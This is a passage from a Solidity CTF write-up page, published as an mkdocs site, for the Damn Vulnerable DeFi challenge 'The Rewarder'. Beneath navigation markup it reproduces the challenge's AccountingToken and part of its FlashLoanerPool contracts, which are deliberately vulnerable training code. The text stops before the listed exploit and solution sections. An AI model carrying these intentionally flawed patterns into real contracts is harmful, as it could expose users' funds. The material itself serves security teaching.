@@ -1,0 +1,1444 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../04.%20Side%20Entrance/">
+      
+      
+        <link rel="next" href="../06.%20Selfie/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.6">
+    
+    
+      
+        <title>The Rewarder - Solidity CTFs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.558e4712.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#the-rewarder" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Solidity CTFs" class="md-header__button md-logo" aria-label="Solidity CTFs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Solidity CTFs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              The Rewarder
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/dmtrbch/solidity-ctfs/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    dmtrbch/solidity-ctfs
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Solidity CTFs" class="md-nav__button md-logo" aria-label="Solidity CTFs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Solidity CTFs
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/dmtrbch/solidity-ctfs/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    dmtrbch/solidity-ctfs
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Welcome!
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" tabindex="0" aria-expanded="false">
+          1. Ethernaut
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="1. Ethernaut" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          1. Ethernaut
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/01.%20Fallback/" class="md-nav__link">
+        Fallback
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/02.%20Fallout/" class="md-nav__link">
+        Fallout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/03.%20Coin%20Flip/" class="md-nav__link">
+        Coin Flip
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/04.%20Telephone/" class="md-nav__link">
+        Telephone
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/05.%20Token/" class="md-nav__link">
+        Token
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/06.%20Delegation/" class="md-nav__link">
+        Delegation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/07.%20Force/" class="md-nav__link">
+        Force
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/08.%20Vault/" class="md-nav__link">
+        Vault
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/09.%20King/" class="md-nav__link">
+        King
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/10.%20Re-entrancy/" class="md-nav__link">
+        Re-entrancy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/11.%20Elevator/" class="md-nav__link">
+        Elevator
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/15.%20Naught%20Coin/" class="md-nav__link">
+        Naught Coin
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/16.%20Preservation/" class="md-nav__link">
+        Preservation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/17.%20Recovery/" class="md-nav__link">
+        Recovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/20.%20Denial/" class="md-nav__link">
+        Denial
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/21.%20Shop/" class="md-nav__link">
+        Shop
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/23.%20Dex%20Two/" class="md-nav__link">
+        Dex Two
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/24.%20Puzzle%20Wallet/" class="md-nav__link">
+        Puzzle Wallet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/25.%20Motorbike/" class="md-nav__link">
+        Motorbike
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" tabindex="0" aria-expanded="false">
+          2. Capture the Ether
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="2. Capture the Ether" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          2. Capture the Ether
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/01.%20Guess%20the%20number/" class="md-nav__link">
+        Guess the number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/02.%20Guess%20the%20secret%20number/" class="md-nav__link">
+        Guess the secret number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/03.%20Guess%20the%20random%20number/" class="md-nav__link">
+        Guess the random number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/04.%20Guess%20the%20new%20number/" class="md-nav__link">
+        Guess the new number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/05.%20Predict%20the%20future/" class="md-nav__link">
+        Predict the future
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/06.%20Predict%20the%20block%20hash/" class="md-nav__link">
+        Predict the block hash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/07.%20Token%20sale/" class="md-nav__link">
+        Token sale
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/08.%20Token%20whale/" class="md-nav__link">
+        Token whale
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/09.%20Retirement%20fund/" class="md-nav__link">
+        Retirement fund
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/10.%20Token%20bank/" class="md-nav__link">
+        Token bank
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" tabindex="0" aria-expanded="true">
+          3. Damn Vulnerable Defi
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="3. Damn Vulnerable Defi" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          3. Damn Vulnerable Defi
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01.%20Unstoppable/" class="md-nav__link">
+        Unstoppable
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02.%20Naive%20receiver/" class="md-nav__link">
+        Naive receiver
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03.%20Truster/" class="md-nav__link">
+        Truster
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04.%20Side%20Entrance/" class="md-nav__link">
+        Side Entrance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          The Rewarder
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        The Rewarder
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#goal" class="md-nav__link">
+    Goal
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attacker-contract-code" class="md-nav__link">
+    Attacker contract code
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution-code" class="md-nav__link">
+    Solution code
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06.%20Selfie/" class="md-nav__link">
+        Selfie
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11.%20Backdoor/" class="md-nav__link">
+        Backdoor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../12.%20Climber/" class="md-nav__link">
+        Climber
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#goal" class="md-nav__link">
+    Goal
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attacker-contract-code" class="md-nav__link">
+    Attacker contract code
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution-code" class="md-nav__link">
+    Solution code
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+
+<h1 id="the-rewarder">The Rewarder</h1>
+<p>AccountingToken.sol</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;solady/src/auth/OwnableRoles.sol&quot;</span><span class="p">;</span>
+
+<span class="o">/**</span>
+ <span class="o">*</span> <span class="nd">@title</span> <span class="n">AccountingToken</span>
+ <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
+ <span class="o">*</span> <span class="nd">@notice</span> <span class="n">A</span> <span class="n">limited</span> <span class="n">pseudo</span><span class="o">-</span><span class="n">ERC20</span> <span class="n">token</span> <span class="n">to</span> <span class="n">keep</span> <span class="n">track</span> <span class="n">of</span> <span class="n">deposits</span> <span class="ow">and</span> <span class="n">withdrawals</span>
+ <span class="o">*</span>         <span class="k">with</span> <span class="n">snapshotting</span> <span class="n">capabilities</span><span class="o">.</span>
+ <span class="o">*/</span>
+<span class="n">contract</span> <span class="n">AccountingToken</span> <span class="ow">is</span> <span class="n">ERC20Snapshot</span><span class="p">,</span> <span class="n">OwnableRoles</span> <span class="p">{</span>
+    <span class="n">uint256</span> <span class="n">public</span> <span class="n">constant</span> <span class="n">MINTER_ROLE</span> <span class="o">=</span> <span class="n">_ROLE_0</span><span class="p">;</span>
+    <span class="n">uint256</span> <span class="n">public</span> <span class="n">constant</span> <span class="n">SNAPSHOT_ROLE</span> <span class="o">=</span> <span class="n">_ROLE_1</span><span class="p">;</span>
+    <span class="n">uint256</span> <span class="n">public</span> <span class="n">constant</span> <span class="n">BURNER_ROLE</span> <span class="o">=</span> <span class="n">_ROLE_2</span><span class="p">;</span>
+
+    <span class="n">error</span> <span class="bp">NotImplemented</span><span class="p">();</span>
+
+    <span class="n">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s2">&quot;rToken&quot;</span><span class="p">,</span> <span class="s2">&quot;rTKN&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_initializeOwner</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">);</span>
+        <span class="n">_grantRoles</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">MINTER_ROLE</span> <span class="o">|</span> <span class="n">SNAPSHOT_ROLE</span> <span class="o">|</span> <span class="n">BURNER_ROLE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">mint</span><span class="p">(</span><span class="n">address</span> <span class="n">to</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlyRoles</span><span class="p">(</span><span class="n">MINTER_ROLE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">burn</span><span class="p">(</span><span class="n">address</span> <span class="n">from</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="n">onlyRoles</span><span class="p">(</span><span class="n">BURNER_ROLE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_burn</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">snapshot</span><span class="p">()</span> <span class="n">external</span> <span class="n">onlyRoles</span><span class="p">(</span><span class="n">SNAPSHOT_ROLE</span><span class="p">)</span> <span class="n">returns</span> <span class="p">(</span><span class="n">uint256</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">_snapshot</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">_transfer</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">uint256</span><span class="p">)</span> <span class="n">internal</span> <span class="n">pure</span> <span class="n">override</span> <span class="p">{</span>
+        <span class="n">revert</span> <span class="bp">NotImplemented</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">_approve</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">uint256</span><span class="p">)</span> <span class="n">internal</span> <span class="n">pure</span> <span class="n">override</span> <span class="p">{</span>
+        <span class="n">revert</span> <span class="bp">NotImplemented</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>FlashLoanerPool.sol</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;../DamnValuableToken.sol&quot;</span><span class="p">;</span>
+
+<span class="o">/**</span>
+ <span class="o">*</span> <span class="nd">@title</span> <span class="n">FlashLoanerPool</span>
+ <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
+ <span class="o">*</span> <span class="nd">@dev</span> <span class="n">A</span> <span class="n">simple</span> <span class="n">pool</span> <span class="n">to</span> <span class="n">get</span> <span class="n">flashloans</span> <span class="n">of</span> <span class="n">DVT</span>
+ <span class="o">*/</span>
+<span class="n">contract</span> <span class="n">FlashLoanerPool</span> <span class="ow">is</span> <span class="n">ReentrancyGuard</span> <span class="p">{</span>
+    <span class="n">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="n">address</span><span class="p">;</span>
+
+    <span class="n">DamnValuableToken</span> <span class="n">public</span> <span class="n">immutable</span> <span class="n">liquidityToken</span><span class="p">;</span>
+
+    <span class="n">error</span> <span class="n">NotEnoughTokenBalance</span><span class="p">();</span>
+    <span class="n">error</span> <span class="n">CallerIsNotContract</span><span class="p">();</span>
+    <span class="n">error</span> <span class="n">FlashLoanNotPaidBack</span><span class="p">();</span>
+
+    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">liquidityTokenAddress</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">liquidityToken</span> <span class="o">=</span> <span class="n">DamnValuableToken</span><span class="p">(</span><span class="n">liquidityTokenAddress</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">function</span> <span class="n">flashLoan</span><span class="p">(</span><span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">external</span> <span class="n">nonReentrant</span> <span class="p">{</span>
+        <span class="n">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="n">liquidityToken</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">address</span><span class="p">(</span><span class="n">this</span><span class="p">));</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="n">balanceBefore</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">revert</span> <span class="n">NotEnoughTokenBalance</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="o">.</span><span class="n">isContract</span><span class="p">())</span> <span class="p">{</span>
+            <span class="n">revert</span> <span class="n">CallerIsNotContract</span><span class="p">();</span>
